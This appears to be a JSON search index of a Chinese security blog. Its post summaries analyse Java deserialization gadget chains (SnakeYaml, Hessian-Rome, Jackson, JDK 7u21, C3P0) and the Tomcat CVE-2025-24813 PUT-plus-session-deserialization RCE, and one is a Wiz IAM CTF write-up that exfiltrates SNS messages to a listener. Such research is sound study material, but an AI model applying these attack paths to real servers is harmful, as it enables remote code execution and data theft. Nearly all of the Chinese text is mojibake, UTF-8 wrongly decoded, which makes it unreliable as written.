[{"title":"C3P0é“¾åˆ†æ","date":"2025-03-25T05:08:32.877Z","url":"/2025/03/25/C3P0%E9%93%BE%E5%88%86%E6%9E%90/","tags":[["C3P0é“¾åˆ†æ","/tags/C3P0%E9%93%BE%E5%88%86%E6%9E%90/"]],"categories":[["C3P0é“¾åˆ†æ","/categories/C3P0%E9%93%BE%E5%88%86%E6%9E%90/"]],"content":"URLClassloaderé“¾ JDNIé“¾ é€šè¿‡Fastjsonè°ƒç”¨ä¸¤ä¸ªsetteræ–¹æ³•å®ç°èµ‹å€¼å¹¶è°ƒç”¨ Hexæµååºåˆ—åŒ–ä¹Ÿæ˜¯ç»“åˆFastjsonè°ƒç”¨setterè¿›è¡Œåˆ©ç”¨ å‚è€ƒ"},{"title":"SnakeYamlååºåˆ—åŒ–æ¼æ´åˆ†æ","date":"2025-03-24T02:42:00.805Z","url":"/2025/03/24/SnakeYaml%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","tags":[["SankeYamlååºåˆ—åŒ–","/tags/SankeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"categories":[["SankeYamlååºåˆ—åŒ–æ¼æ´åˆ†æ","/categories/SankeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"]],"content":"SnakeYamlä¸Fastjsonçš„åŠŸèƒ½å¯¹æ¯”SnakeYamlçš„åŠŸèƒ½æ˜¯å°†ä¸€ä¸ªjavaå¯¹è±¡åºåˆ—åŒ–ä¸º.yamlæ–‡ä»¶ &amp;&amp; å°†.yamlæ–‡ä»¶ååºåˆ—åŒ–å›ä¸€ä¸ªjavaå¯¹è±¡ SnakeYamlçš„åŠŸèƒ½æ˜¯å°†ä¸€ä¸ªjavaå¯¹è±¡åºåˆ—åŒ–ä¸º.jsonæ–‡ä»¶ &amp;&amp; å°†.jsonæ–‡ä»¶ååºåˆ—åŒ–å›ä¸€ä¸ªjavaå¯¹è±¡ æ˜ å°„ä¸åºåˆ— æ‰€ä»¥è¿™ä¸¤ç§å†™æ³•åœ¨SnakeYamlä¸­å¯¹åº”ç€ä¸¤ä¸ªä¸åŒçš„æ„é€ å‡½æ•° æ˜ å°„(Mapping)å…ˆç”¨ä¸€ä¸ªUserç±»Demoè¿›è¡Œè°ƒè¯•åˆ†æ User.java SnakeYamlDemo.java å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨äº†Userç±»çš„æ— å‚æ„é€ æ–¹æ³•å’Œsetteræ–¹æ³•ã€‚ è°ƒç”¨å †æ ˆï¼š å› ä¸º!!User &#123;age: 18, name: xiaobei&#125;å±äºæ˜ å°„ï¼Œæ‰€ä»¥è°ƒç”¨MappingNodeçš„æ„é€ å‡½æ•°org.yaml.snakeyaml.constructor.Constructor.ConstructMapping#constructï¼Œè¿™é‡Œé€šè¿‡è°ƒç”¨å†…ç½®é€»è¾‘åˆ›å»ºäº†Userç±»çš„å®ä¾‹å¯¹è±¡ï¼Œè·Ÿè¿›å»çœ‹ä¸€ä¸‹å†…ç½®é€»è¾‘æ˜¯æ€ä¹ˆå†™çš„ æœ€ç»ˆçš„é€»è¾‘åœ¨org.yaml.snakeyaml.constructor.BaseConstructor#newInstance(java.lang.Class&lt;?&gt;, org.yaml.snakeyaml.nodes.Node, boolean)ï¼Œé€šè¿‡åå°„æœºåˆ¶è·å–å¹¶è°ƒç”¨Userç±»çš„æ— å‚æ„é€ æ–¹æ³•ï¼Œå¹¶è°ƒç”¨åˆ›å»ºUserç±»çš„å®ä¾‹å¯¹è±¡ ç»§ç»­è¿”å›è·Ÿè¿›constructJavaBean2ndStepæ–¹æ³•ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ä¼šå–å‡ºæ˜ å°„ä¸­çš„Keyä¸Valueçš„å€¼ï¼Œå¹¶åˆ©ç”¨åå°„æœºåˆ¶è°ƒç”¨Userç±»çš„&#96;&#96;setter&#96;æ–¹æ³•è¿›è¡Œèµ‹å€¼ JdbcRowSetImplé“¾å·²çŸ¥å½“SnakeYamlååºåˆ—åŒ–å­—ç¬¦ä¸²ä¸ºMappingæ˜ å°„å½¢å¼æ—¶ï¼Œä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„æ— å‚æ„é€ æ–¹æ³•å’Œsetteræ–¹æ³•ï¼Œæ‰€ä»¥æ€è·¯1æ˜¯åˆ©ç”¨JdbcRowSetImplé“¾æ‰“Jndiæ³¨å…¥ åºåˆ—(Sequence) é‡æ–°æ‰“æ–­ç‚¹è·Ÿè¿›ï¼Œå’Œæ˜ å°„(Mapping)çš„é€»è¾‘æœ‰æ‰€ä¸åŒï¼Œå…ˆæ¥åˆ°org.yaml.snakeyaml.constructor.Constructor.ConstructYamlObject#construct æ¥åˆ°æ„é€ å‡½æ•°org.yaml.snakeyaml.constructor.Constructor.ConstructSequenceï¼Œåœ¨forå¾ªç¯ä¸­è¿›è¡Œé€’å½’è°ƒç”¨ï¼Œæœ€åè¿”å›çš„æ˜¯è¢«èµ‹å®Œå€¼çš„URLClassLoaderå¯¹è±¡ javax.script.ScriptEngineManageré“¾å·¥å…·é¡¹ç›®åœ°å€ï¼š Java-SPIæœºåˆ¶åˆ†æï¼š Payloadå³ä¸Šæ–‡åºåˆ—(Sequence)è°ƒè¯•çš„payloadï¼Œå·¥å…·åˆ©ç”¨æ–¹æ³•å‚è€ƒREADME.mdæ–‡ä»¶å’Œæ–‡ç« ï¼š  SnakeYaml + C3P0C3P0é“¾åˆ†æè§ -&gt;  jndié“¾ HexæµååºåŒ–é“¾ä¸jndié“¾åŒç†ï¼Œæ„é€ ç›¸ä¼¼payloadå³å¯ï¼ŒåŸç†ä¸åšèµ˜è¿° æ¢æµ‹payloadpayloadå‚è€ƒï¼š URLDNSé“¾å‚è€ƒï¼š å†™åœ¨æœ€åæ„Ÿè§‰SnakeYamlååºåˆ—åŒ–çš„æœ¬è´¨ä¾ç„¶æ˜¯å¯¹setteræ–¹æ³•çš„è°ƒç”¨ï¼Œæ‰€ä»¥ä¸€äº›Fastjsonçš„é“¾å­åœ¨SnakeYamlä¸­ä¹Ÿå¯ä»¥æ‰“ï¼Œè¿˜æ˜¯éœ€è¦æ…¢æ…¢ç ”ç©¶ã€‚"},{"title":"ä»Tomcatå†å²æ¼æ´åˆ†æCVE-2025-24813","date":"2025-03-20T01:35:58.642Z","url":"/2025/03/20/Tomcat-PUT%E5%88%86%E6%9E%90/","tags":[["Tomcat","/tags/Tomcat/"]],"categories":[["Tomcat","/categories/Tomcat/"]],"content":"ç¯å¢ƒä¸è°ƒè¯•(1) Tomcatå„ç‰ˆæœ¬ä¸‹è½½ï¼š (2) IDEAè¿œç¨‹JVMè°ƒè¯•ï¼š Tomcat PUT RCECVE-2017-12615 å‚è€ƒï¼š æœ¬è´¨æ˜¯åˆ©ç”¨æ„é€ ç‰¹æ®Šåç¼€åç»•è¿‡JSPServletçš„æ£€æµ‹ï¼Œæ‰§è¡ŒDefaultServletä¸­çš„doPuté€»è¾‘ï¼Œä¸Šä¼ æ¶æ„jspæ–‡ä»¶ã€‚ Tomcat Sessionååºåˆ—åŒ–CVE-2020-9484 é¦–å…ˆåœ¨/conf/context.xmlä¸­å¼€å¯ä¼šè¯ç®¡ç†å™¨ PersistentManager æ˜¯ Tomcat ä¸­çš„ä¸€ç§ä¼šè¯ç®¡ç†å™¨ï¼Œå®ƒå…è®¸ ä¼šè¯æ•°æ® åœ¨ Tomcat é‡å¯æˆ–æœåŠ¡å™¨åœæœºæ—¶å¾—ä»¥ æŒä¹…åŒ–å­˜å‚¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒTomcat çš„ä¼šè¯æ•°æ®å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä½†å¦‚æœå¯ç”¨äº† PersistentManagerï¼Œä¼šè¯æ•°æ®ä¼šè¢«å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä»è€Œåœ¨ Tomcat é‡å¯åä¿æŒä¼šè¯çŠ¶æ€ã€‚ className=&quot;org.apache.catalina.session.PersistentManageræŒ‡å®šäº†ä½¿ç”¨PersistentManageræ¥ç®¡ç†ä¼šè¯ã€‚ FileStore æ˜¯ PersistentManager ç”¨æ¥å°†ä¼šè¯æ•°æ®å­˜å‚¨åˆ°ç£ç›˜ä¸Šçš„ç±»ã€‚å®ƒå°†ä¼šè¯å¯¹è±¡åºåˆ—åŒ–ä¸ºæ–‡ä»¶ï¼Œå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ä¸­ï¼Œæ”¯æŒè·¨æœåŠ¡å™¨é‡å¯ä¿æŒä¼šè¯çŠ¶æ€ã€‚ directory=&quot;/Users/gehansheng/Desktop/Javaä»£ç å®¡è®¡/Tomcatå†å²æ¼æ´åˆ†æ/apache-tomcat-10.0.0-M4/sessionFile&quot;ä¸ºæŒ‡å®šå­˜å‚¨ä¼šè¯æ•°æ®çš„ç›®å½•æ–‡ä»¶ã€‚ æ—¢ç„¶FileStoreä¼šå°†ä¼šè¯æ•°æ®åºåˆ—åŒ–ä¸ºæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„é£é™©ï¼Œè¿™ä¸ªæ¼æ´å°±æ˜¯ç”±æ­¤äº§ç”Ÿçš„ã€‚ ä½¿ç”¨CCé“¾éªŒè¯æ¼æ´ï¼Œå…ˆåœ¨/webapps/ROOT/WEB_INF/libä¸‹æ·»åŠ commons-collections-3.2.1.jaråŒ…çš„ä¾èµ–ï¼Œç„¶åä½¿ç”¨ysoserialç”Ÿæˆå«æœ‰æ¶æ„åºåˆ—åŒ–å†…å®¹çš„payload.sessionæ–‡ä»¶ éªŒè¯ - å‘½ä»¤æ‰§è¡Œ ååºåˆ—åŒ–.sessionåºåˆ—åŒ–æ–‡ä»¶çš„å‡½æ•°ä¸ºorg.apache.catalina.session.FileStore#load è°ƒç”¨é€»è¾‘å¤§è‡´å¦‚ä¸‹ æ€»ç»“æ¥çœ‹ï¼Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ¡ä»¶å¾ˆé«˜ Tomcat æ–‡ä»¶ä¸Šä¼  + sessionååºåˆ—åŒ–CVE-2025-24813 åˆ©ç”¨æ¡ä»¶æ˜¯ CVE-2017-12615 å’Œ CVE-2020-9484 çš„æ±‡æ€» æ¼æ´æµç¨‹å¤§çº¦å¦‚ä¸‹ PUT /xxxxxx/session -&gt; /work/Catalina/localhost/ROOT/.xxxxxx.sessionçš„é€»è¾‘å‘ç”Ÿåœ¨org.apache.catalina.servlets.DefaultServlet#executePartialPutä¸­ èµ°åˆ°ifä¸­çš„å‰ææ¡ä»¶æ˜¯rangeä¸ä¸ºç©ºï¼Œè·Ÿè¿›org.apache.catalina.servlets.DefaultServlet#parseContentRangeï¼Œå‘ç°å…¶ä¸ºContent-Rangeè¯·æ±‚å¤´ æ„é€ è¯·æ±‚å¤´å³å¯ é‚£ä¹ˆåªéœ€è¦PUTæ¶æ„åºåˆ—åŒ–å­—èŠ‚ç ï¼Œå°±å¯ä»¥å‡ºå‘ååºåˆ—åŒ–RCEäº†ã€‚ "},{"title":"WIZCTF The Big IAM Challenges","date":"2025-03-18T00:35:15.604Z","url":"/2025/03/18/WIZCTF%20The%20Big%20IAM%20Challenges/","tags":[["äº‘å®‰å…¨","/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"]],"categories":[["äº‘å®‰å…¨","/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"]],"content":"é¢˜ç›®é¦–å…ˆç»™å‡ºamazon-s3äº‘å­˜å‚¨çš„ IAM Policy æ‹¥æœ‰éå†Bucket Objectçš„æƒé™ - &quot;Action&quot;: &quot;s3:ListBucket&quot;ï¼Œä½¿ç”¨å‘½ä»¤è¡Œåˆ—å‡ºæ¡¶ä¸­çš„Object å°†files/flag1.txtä¸‹è½½åˆ°æŒ‡å®šç›®å½•å¹¶è¯»å– Google Analytics SQSçš„é˜Ÿåˆ—URLæ ¼å¼å¦‚ä¸‹æ‰€ç¤º æŸ¥çœ‹receive-messageå‘ç°Bodyä¸­çš„URLå‚æ•°ï¼Œè®¿é—®å¾—åˆ°flag åœ¨å‰ç«¯HTMLä»£ç ä¹Ÿå¯ä»¥è·å¾—QueueURL Enable Push Notification ç»™å‡ºçš„SNSçš„IAMç­–ç•¥å¦‚ä¸‹æ‰€ç¤º ç”±äº&quot;sns:Endpoint&quot;: &quot;*@tbic.wiz.io&quot;å¯¼è‡´--notification-endpointçš„å€¼å¿…é¡»ä½¿ç”¨@tbic.wiz.ioé‚®ç®±ï¼Œå¯ä»¥ä½¿ç”¨httpåè®®å¤–å¸¦è¿›è¡Œç»•è¿‡ åŒæ—¶åœ¨VPSä¸­ç›‘å¬101.xx.xx.105:2333ç«¯å£ï¼Œè¦å…ˆåç›‘å¬ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ä¸ºæˆåŠŸè®¢é˜…ï¼Œç¬¬äºŒæ¬¡ä¸ºæ¥æ”¶è®¢é˜…åè¿”å›çš„ä¿¡æ¯ å¾—åˆ°flag Admin only?ä¹Ÿæ˜¯ä¸€ä¸ªs3å­˜å‚¨æ¡¶çš„IAMç­–ç•¥ é¦–å…ˆå°è¯•åˆ—å‡ºfiles/ä¸‹çš„æ–‡ä»¶çœ‹çœ‹éƒ½æœ‰å“ªäº›ï¼Œç»“æœæƒé™ä¸è¶³Access Denied æ ¹æ®ç»™å‡ºçš„IAMç­–ç•¥å¯çŸ¥ListBucketéœ€è¦åŒæ—¶æ»¡è¶³å‰ç¼€ä¸ºfiles/å’Œè¯·æ±‚è€…ä¸ºadminç”¨æˆ·è¿™ä¸¤ä¸ªæ¡ä»¶ ç”±äºè¿™æ¡ç­–ç•¥ï¼Œæ‰€ä»¥å¯ä»¥é‡‡å–åŒ¿åè®¿é—®ï¼Œä¸éœ€è¦è¿›è¡Œç­¾å æ‹¿åˆ°äº†Keyä¿¡æ¯ï¼Œç›´æ¥ä½¿ç”¨get-objectä¸‹è½½è®¿é—®å³å¯ Do I Know You? æ ¹æ®ç­–ç•¥ï¼Œé¢˜ç›®ä½¿ç”¨äº†AWS-Cognito é¢˜ç›®å‰ç«¯æºä»£ç ä¸­æ³„éœ²äº†èº«ä»½æ± identityPoolId åˆ©ç”¨identityPoolIdè·å–è®¤è¯IdentityId åˆ©ç”¨IdentityIdç”Ÿæˆä¸´æ—¶å‡­æ® ç„¶åå¯ä»¥ä½¿ç”¨ä¸´æ—¶å‡­è¯è®¿é—®æ¡¶ä¸­æ•°æ®ä¿¡æ¯ï¼Œä¸ºæ­¤å¯ä»¥å†™ä¸€ä¸ªHTMLè„šæœ¬æ¥ç”Ÿæˆé¢„ç­¾åURL æ‰“å¼€ç½‘é¡µååœ¨å‰ç«¯å¼€å‘è€…å·¥å…·æ§åˆ¶å°ä¸­è¾“å‡ºé¢„ç­¾åURL è®¿é—®æ‰§è¡ŒlistObjectsæ“ä½œï¼Œå¯ä»¥è·å¾—Keyå€¼ä¸ºflag1.txt ä¿®æ”¹è„šæœ¬ï¼Œåˆ©ç”¨getObjectè®¿é—®flag.txtå³å¯æ‹¿åˆ°flag One final push é—®äº†ä¸‹GPTï¼Œä½¿ç”¨AssumeRoleWithWebIdentityç”ŸæˆSTSä¸´æ—¶å‡­è¯çš„æ–¹æ³•å¿…é¡»æœ€å°‘éœ€è¦ä¸‰ä¸ªå‚æ•° é¢˜ç›®ä¸­å·²ç»ç»™äº†RoleArn-&gt;arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role RoleSessionNameå¯ä»¥è‡ªå®šä¹‰ WebIdentityéœ€è¦é€šè¿‡èº«ä»½æ± Idæ¥è·å– æ‰‹åŠ¨è¾“å…¥æ€»æ˜¯å› ä¸ºå°‘å­—ç¬¦æˆ–æ¢è¡Œç¬¦å‘ç”Ÿé”™è¯¯ï¼Œç´¢æ€§è®©GPTç”Ÿæˆäº†ä¸ªJSè„šæœ¬ æ‹¿åˆ°Flag - &#123;wiz:open-sesame-or-shell-i-say-openid&#125; "},{"title":"Hessian_Romeé“¾åˆ†æ","date":"2025-03-03T02:33:32.714Z","url":"/2025/03/03/Hessian_Rome%E9%93%BE/","tags":[["Hessianååºåˆ—åŒ–","/tags/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"categories":[["Hessianååºåˆ—åŒ–","/categories/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"content":"Hessian_Romeé“¾å‡ºç½‘(JdbcRowSetImplé“¾)ç¯å¢ƒé…ç½® è°ƒç”¨æµç¨‹ æµç¨‹åˆ†æ com.rometools.rome.feed.impl.ToStringBean#toString(java.lang.String)ä¼šéå†beanClassä¸­çš„æ‰€æœ‰getteræ–¹æ³• com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaDataæ–¹æ³•è°ƒç”¨äº†com.sun.rowset.JdbcRowSetImpl#connect()ï¼Œå¯ä»¥è§¦å‘JNDIæ³¨å…¥ï¼Œä¸”ç¬¦åˆæ¡ä»¶ä¸ºgetteræ–¹æ³•ï¼Œæ˜¯åˆ©ç”¨é“¾çš„sinkç‚¹ EXP æ„é€ EXPéœ€è¦æ³¨æ„çš„å‡ ä¸ªç‚¹ 1ã€éœ€è¦é€šè¿‡ClassPool.removeMethodæå‰ç§»é™¤JdbcRowSetImplç±»ä¸­çš„getMatchColumnNamesæ–¹æ³•ï¼Œå¦åˆ™ä¼šåœ¨æ‰§è¡ŒgetDatabaseMetaData()ä¹‹å‰ï¼Œæ‰§è¡ŒgetMatchColumnNamesçš„æ—¶å€™å‘ç”ŸæŠ¥é”™ 2ã€éœ€è¦æ‰‹åŠ¨åˆ›å»ºNode&lt;K,V&gt;[] tableå¹¶å­˜å…¥åˆ©ç”¨åå°„å­˜å…¥é”®å€¼å¯¹ï¼Œå› ä¸ºç›´æ¥ä½¿ç”¨map.putä¼šæå‰è§¦å‘hashCodeæ–¹æ³•å¯¼è‡´æå‰å‘½ä»¤æ‰§è¡Œã€‚ ä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨TemplatesImplHessianInput.readObjectä¸åŒäºObjectInputStream.readObjectï¼ŒHessianInput.readObjectä¸ä¼šæ‰§è¡Œååºåˆ—åŒ–ç±»é‡å†™çš„readObjectæ–¹æ³•ï¼Œè€ŒTemplatesImplç±»ä¸­çš„_tfactoryä¸ºtransientä¿®é¥°ï¼Œä¸å¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œè¿™ä¼šå¯¼è‡´ç©ºæŒ‡é’ˆé”™è¯¯ æ­£å¸¸çš„ObjectInputStream.readObjectååºåˆ—åŒ–é€»è¾‘ä¸­ï¼Œååºåˆ—åŒ–æ—¶è°ƒç”¨TemplatesImpl ä¸å‡ºç½‘(äºŒæ¬¡ååºåˆ—åŒ–)æ—¢ç„¶HessianInput.readObjectæ— æ³•è°ƒç”¨TemplatesImpl.readObjectä¸º_tfactoryå­—æ®µèµ‹å€¼ï¼Œåˆ©ç”¨SignedObject.getObjectäºŒæ¬¡ååºåˆ—åŒ–BadAttributeValueExpExceptionå³å¯ è°ƒç”¨é“¾ EXP åˆ©ç”¨é“¾ä¸ç¨³å®šçš„ç‚¹ å½“å¼€å§‹è°ƒç”¨TemplatesImplç±»ä¸­çš„getteræ–¹æ³•æ—¶ï¼Œä¼šæœ‰é¡ºåºé—®é¢˜ï¼Œè‹¥com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getStylesheetDOMæ–¹æ³•çš„è°ƒç”¨é¡ºåºåœ¨getoutPropertiesä¹‹å‰ï¼Œåˆ™ä¼šå‡ºç°ç©ºæŒ‡é’ˆé”™è¯¯ï¼Œè¿™å’ŒJacksonåˆ©ç”¨é“¾çš„ä¸ç¨³å®šçš„åŸå› å¼‚æ›²åŒå·¥ ä¸ºä»€ä¹ˆä¸å¯ä»¥ç”¨åå°„ä¸º_sdomèµ‹å€¼ å› ä¸º_sdomä¸ºtransientä¿®é¥°ï¼Œæ— æ³•è¢«åºåˆ—åŒ–ï¼Œå³ä½¿åå°„èµ‹å€¼ï¼Œè°ƒç”¨æ—¶ä¾ç„¶ä¸ºé»˜è®¤å€¼nullï¼Œä¸”åœ¨TemplatesImpl.readObjectå¹¶æ²¡æœ‰æ˜¾ç¤ºçš„ä¸º_sdomèµ‹å€¼çš„é€»è¾‘ï¼Œå¯¼è‡´ç©ºæŒ‡é’ˆé”™è¯¯æ— æ³•è¢«æœ‰æ•ˆè§£å†³ æ€è€ƒ é€šè¿‡é˜…è¯»Jacksonåˆ©ç”¨é“¾çš„ä¸ç¨³å®šæ€§ï¼Œä¸‹é¢æ–‡ç« æå‡ºäº†ä½¿ç”¨åŠ¨æ€ä»£ç†çš„è§£å†³æ–¹æ¡ˆ   ä½†æ˜¯åœ¨Hessianä¸­çš„è§£å†³æ–¹æ³•ä¾ç„¶åœ¨æ€è€ƒä¸­"},{"title":"Jacksonååºåˆ—åŒ–JDKåŸç”Ÿåˆ©ç”¨é“¾","date":"2025-03-02T05:29:10.363Z","url":"/2025/03/02/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96JDK%E5%8E%9F%E7%94%9F%E5%88%A9%E7%94%A8%E9%93%BE/","tags":[["Jackson","/tags/Jackson/"]],"categories":[["Jackson","/categories/Jackson/"]],"content":"å‰è¨€ä¸FasyjsonåŸç”ŸJDKååºåˆ—åŒ–åˆ©ç”¨ç›¸åŒï¼ŒJacksonä¹Ÿå¯ä»¥ç»“åˆåŸç”ŸJDKè¿›è¡Œååºåˆ—åŒ–åˆ©ç”¨ã€‚ä¸”SpringBooté»˜è®¤é›†æˆJacksonä½œä¸ºå…¶JSONå¤„ç†åº“ï¼Œæ‰€ä»¥æ”»å‡»é¢æ›´å¹¿ã€‚ Gadget writeValueStringæ­£æ˜¯Jacksonåºåˆ—åŒ–çš„å…¥å£å‡½æ•°ï¼Œä¼šè°ƒç”¨åºåˆ—åŒ–å¯¹è±¡çš„æ‰€æœ‰public_getteræ–¹æ³•ã€‚ åˆ†æPOJONodeç±»ä¸­æ²¡æœ‰toStringæ–¹æ³•ï¼Œä½†å…¶çˆ¶ç±»çš„çˆ¶ç±»BaseJsonNodeæ‹¥æœ‰toStringæ–¹æ³• nodeToStringæ–¹æ³•ä¸­è°ƒç”¨äº†writeValueAStringï¼Œè¿›è€Œè°ƒç”¨æ¶æ„ç±»çš„public_getteræ–¹æ³•ï¼Œå¦‚TemplatesImplç±»ä¸­çš„getOutPropertiesæ–¹æ³• å‚è€ƒFastjsonåŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨ï¼Œä½¿ç”¨javax.management.BadAttributeValueExpException#readObjectæ¥è§¦å‘POJONode.readObjectæ–¹æ³• EXPTemplatesImplé“¾æ³¨ï¼šåˆ©ç”¨ClassPoolåˆ é™¤äº†BaseJsonNodeç±»ä¸­çš„writeReplaceæ–¹æ³•ï¼Œå¦åˆ™åœ¨åºåˆ—åŒ–payloadæ—¶ä¼šæŠ¥é”™ SignedObjectäºŒæ¬¡ååºåˆ—åŒ–"},{"title":"JDK_7u21é“¾åˆ†æ","date":"2025-03-02T00:58:45.168Z","url":"/2025/03/02/JDK_7u21%E9%93%BE/","tags":[["JDKåŸç”Ÿååºåˆ—åŒ–","/tags/JDK%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"categories":[["JDKåŸç”Ÿååºåˆ—åŒ–","/categories/JDK%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"]],"content":"å‰è¨€ç”±äºmacbook ARMæ¶æ„æ²¡æœ‰å¯¹åº”çš„JDK7ï¼Œæ‰€ä»¥å¯¹JDK_7u21JDKåŸç”Ÿåˆ©ç”¨é“¾çš„åˆ†ææ¨è¿Ÿäº†ï¼Œè¿”æ ¡åç”¨windowsè¡¥ä¸Šã€‚ ç¯å¢ƒé…ç½®JDK_7u21æºç åœ°å€ï¼š IDEAä¸­çš„SDKé…ç½®å‚è€ƒä¹‹å‰Commons-Collections1åˆ†æçš„é‚£ç¯‡æ–‡ç« ï¼š Sinkä½ç½®JDK_7u21é“¾çš„sinkç‚¹ä¸ºsun.reflect.annotation.AnnotationInvocationHandler#equalsImplï¼ŒequalsImplæ–¹æ³•ä¸­è°ƒç”¨äº†memberMethod.invoke(o)ï¼Œè€ŒmemberMethodé€šè¿‡getMemberMethods()è¢«éå†èµ‹å€¼ä¸ºtypeç±»ä¸­çš„æ‰€æœ‰è‡ªå®šä¹‰æ–¹æ³•ã€‚ å½“typeä¸ºTemplatesImplç±»æ—¶ï¼Œé€šè¿‡è°ƒç”¨equalsImplæ–¹æ³•ä¾¿å¯è°ƒç”¨getOutPropertiesæ–¹æ³•ï¼Œå®ç°ä»£ç æ‰§è¡Œã€‚ å¯»æ‰¾è°ƒç”¨é“¾ç°åœ¨å¯»æ‰¾èƒ½å¤Ÿè§¦å‘equalsImplæ–¹æ³•çš„é“¾å­ã€‚equalsImplæ–¹æ³•åœ¨sun.reflect.annotation.AnnotationInvocationHandler#invokeä¸­è¢«è°ƒç”¨ï¼Œé¦–å…ˆå¯ä»¥æƒ³åˆ°ä½¿ç”¨åŠ¨æ€ä»£ç†è§¦å‘invokeï¼Œè¿›è€Œè°ƒç”¨equalsImplã€‚è·Ÿè¿›invokeæ–¹æ³•æŸ¥çœ‹equalsImplçš„è§¦å‘æ¡ä»¶ éœ€è¦æ»¡è¶³åŠ¨æ€ä»£ç†å¯¹è±¡proxyçš„è°ƒç”¨æ–¹æ³•å¿…é¡»ä¸ºequalsã€‚ ä¼—æ‰€å‘¨çŸ¥HashSetæ˜¯ä¸€ç§ç”¨æ¥å»é‡çš„æ•°æ®ç»“æ„ï¼Œ é€šè¿‡å°†å¯¹è±¡ä¿å­˜åœ¨HashMapçš„Keyå¤„æ¥åšå»é‡ï¼ŒHashSet.readObjectæ–¹æ³•å¦‚ä¸‹æ‰€ç¤º è·Ÿè¿›map.putæ–¹æ³•ï¼ŒæŸ¥çœ‹å…¶å»é‡çš„é€»è¾‘ï¼Œå‘ç°å…¶è°ƒç”¨äº†equalsæ–¹æ³• ifè¯­å¥ä¸­çš„è°ƒç”¨é¡ºåºå¦‚ä¸‹ æ•…è§¦å‘equalsçš„æ¡ä»¶æ˜¯ä¸¤ä¸ªä¸åŒå¯¹è±¡çš„å“ˆå¸Œå€¼ç›¸ç­‰ã€‚æ•…æ¥ä¸‹æ¥è®©proxyå¯¹è±¡çš„å“ˆå¸Œå€¼ç­‰äºTemplatesImplå¯¹è±¡çš„å“ˆå¸Œå€¼å³å¯ã€‚ æ„é€ ç›¸ç­‰å“ˆå¸Œå€¼çš„ä¸åŒå¯¹è±¡java.util.HashMap#putä¸­çš„å“ˆå¸Œå€¼è®¡ç®—ä½¿ç”¨int hash = hash(key);ï¼Œè·Ÿè¿›hashæ–¹æ³•ï¼Œå®ƒä¼šè°ƒç”¨Key.hashCodeæ–¹æ³• ä½†è¿™å°†ä¼šè§¦å‘åŠ¨æ€ä»£ç†ï¼Œè°ƒç”¨sun.reflect.annotation.AnnotationInvocationHandler#invokeï¼Œè¿›è€Œè§¦å‘hashCodeImplæ–¹æ³• è·Ÿè¿›hashCodeImplæ–¹æ³•ï¼Œä½¿ç”¨(127 * e.getKey().hashCode()) ^ memberValueHashCode(e.getValue())æ¥è®¡ç®—hashCodeå¹¶è¿”å› è¿™ä¸ªè®¡ç®—æ–¹æ³•äº§ç”Ÿäº†åˆ©ç”¨ç‚¹ï¼Œ0^x = x(xä¸ºä»»æ„å€¼)ï¼Œåªè¦è®©memberValuesçš„Keyä¸ºæŸä¸ªhashCodeå€¼ä¸º0çš„å­—ç¬¦ä¸²ï¼Œvalueä¸ºTemplatesImplå¯¹è±¡ï¼Œè¿™æ ·å®ƒè¿”å›çš„å€¼æ’ä¸ºTemplatesImplå¯¹è±¡çš„hashCodeã€‚è¿™æ ·æ•´æ¡é“¾å­å°±é½äº†ã€‚ å¼•ç”¨Pç¥ã€ŠJavaå®‰å…¨æ¼«è°ˆã€‹ä¸­çš„ä»£ç è·‘å‡ºhashCodeå€¼ä¸º0çš„å­—ç¬¦ä¸² å­—ç¬¦ä¸²ä¸ºf5a5a608 EXP"},{"title":"åˆæ¢Jacksonååºåˆ—åŒ–æ¼æ´","date":"2025-02-24T05:57:03.918Z","url":"/2025/02/24/%E5%88%9D%E6%8E%A2Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","tags":[["Jackson","/tags/Jackson/"]],"categories":[["Jackson","/categories/Jackson/"]],"content":"å‰è¨€å…³äºJacksonçš„ä»‹ç»å’Œç”¨æ³•ï¼Œç‹ç½‘ä¸Šå·²ç»æœ‰å¾ˆå¤šå…¨é¢çš„æ–‡ç« è¿›è¡Œåˆ†æè®²è§£ï¼Œä¸åšè¿‡å¤šçš„èµ˜è¿°äº†ï¼Œå‚è€ƒä¸‹åˆ—æ–‡ç« å³å¯ã€‚   å¯¹äºsetterã€getterè°ƒç”¨é€»è¾‘çš„æ€è€ƒä¸Šè¿°æ–‡ç« 